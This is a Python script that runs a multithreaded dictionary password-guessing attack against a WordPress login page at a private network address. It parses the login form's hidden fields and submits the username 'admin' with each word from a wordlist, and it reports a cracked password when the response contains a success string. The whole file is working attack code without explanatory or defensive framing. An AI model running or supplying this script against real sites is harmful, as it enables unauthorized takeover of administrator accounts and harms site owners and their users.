from urllib.request import build_opener, HTTPCookieProcessor
import http.cookiejar as cookielib
from html.parser import HTMLParser
from urllib.parse import urlencode
from queue import Queue
from threading import Thread

num_threads = 5 #number running thread
wordlist = './dictionary.txt'

targeturl = 'http://192.168.0.14/blog/wp-login.php' #login page
targetpost = 'http://192.168.0.14/blog/wp-login.php' #code to login

useranme_filed = 'log' #user ID input tag value
pass_filed = 'pwd' #user PW input tag value
check = 'update' #login success message
yes = False

class myHTMLParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tagResult = {}
    
    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            tagname = None
            tagvalue = None
            for name, value in attrs:
                if name == 'name':
                    tagname = value
                if name == 'value':
                    tagvalue = value
            
            if tagname is not None:
                self.tagResult[tagname] = tagvalue
            
def webauthCracker(q, username):
    global yes
    while not q.empty() and not yes:
        password = q.get().rstrip()
        cookies = cookielib.FileCookieJar('cookies')
        opener = build_opener(HTTPCookieProcessor(cookies))
        res = opener.open(targeturl)
        htmlpage = res.read().decode()

        print(f'+++TRYING {username}: {password}')
        parseR = myHTMLParser()
        parseR.feed(htmlpage)
        inputtags = parseR.tagResult
        inputtags[useranme_filed] = username
        inputtags[pass_filed] = password

        loginData = urlencode(inputtags).encode('utf-8')
        loginRes = opener.open(targetpost, data=loginData)
        loginResult = loginRes.read().decode()

        if check in loginResult:
            yes = True
            print('---CRACLING SUCCESS!')
            print(f'---Username[{username}] Password[{password}]')
            print('---Waiting Other Threads Terminated..')

def main():
    username = 'admin'
    q = Queue()
    with open(wordlist, 'rt') as f:
        words = f.readlines()
    
    for word in words:
        word = word.rstrip()
        q.put(word)

    print(f'+++[{username}] CRACKING WEB AUTH START...')
    for i in range(num_threads):
        t = Thread(target=webauthCracker, args=(q, username))
        t.start()
    
if __name__ == '__main__':
    main()